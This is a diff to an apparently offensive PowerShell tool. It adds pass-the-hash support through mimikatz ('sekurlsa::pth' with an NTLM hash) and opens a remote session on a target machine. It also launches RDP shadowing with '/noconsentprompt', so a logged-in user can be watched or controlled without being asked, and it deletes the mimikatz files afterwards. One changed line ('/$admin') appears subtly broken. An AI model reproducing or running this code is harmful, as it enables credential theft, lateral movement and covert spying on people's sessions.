@@ -149,7 +149,8 @@ function EnableTLS {
       } until ($input -in '1','2','3','4')
 
    $Host.UI.RawUI.ForegroundColor = 'Gray'
-   if(Test-Path variable:PassTheHash) { $cmd = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell' exit"
+   if(Test-Path variable:PassTheHash) { $powershell = '"$RDP = New-PSSession -Computer $computer -Authentication Kerberos"'
+   $cmd = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` $powershell' exit"
    powershell $mimipath\mimikatz.exe $cmd ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" ; Write-Host ""}
    else { Write-Host ""
    $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
@@ -243,8 +244,9 @@ function EnableTLS {
     Write-Host ""
     $shadow = invoke-command -session $RDP[0] -scriptblock {(Get-Process explorer | Select-Object SessionId | Format-List | findstr "Id" | select -First 1).split(':')[1].trim()}
     Write-Host "Buscando sesiones activas en el equipo.." -ForegroundColor Yellow ; sleep -milliseconds 2500
-    if($control -eq 'true') { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }
-    else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}
+    if(Test-Path variable:PassTheHash) { $admin = "/restrictedadmin" ; $prompt = $null } else { $admin = "/admin" ; $prompt = "/prompt" }
+    if($control -eq 'true') { mstsc /v $computer $admin /shadow:$shadow /control /noconsentprompt $prompt /f }
+    else { mstsc /v $computer /$admin /shadow:$shadow /noconsentprompt $prompt /f }}
 
 Write-Host ""
 Write-Host "Iniciando conexión remota.." -ForegroundColor Blue ; sleep -milliseconds 2500
